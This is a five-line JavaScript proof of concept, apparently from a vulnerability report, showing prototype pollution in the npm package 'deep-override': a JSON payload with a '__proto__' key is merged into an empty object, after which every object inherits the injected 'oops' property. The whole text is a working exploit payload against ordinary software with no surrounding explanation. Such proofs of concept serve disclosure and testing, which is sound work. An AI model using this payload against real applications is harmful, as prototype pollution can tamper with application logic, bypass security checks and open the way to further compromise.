const override = require('deep-override');
console.log({}.oops)
var malicious_payload = '{"__proto__": {"oops": "pwned"}}';
override({}, JSON.parse(malicious_payload))
console.log({}.oops)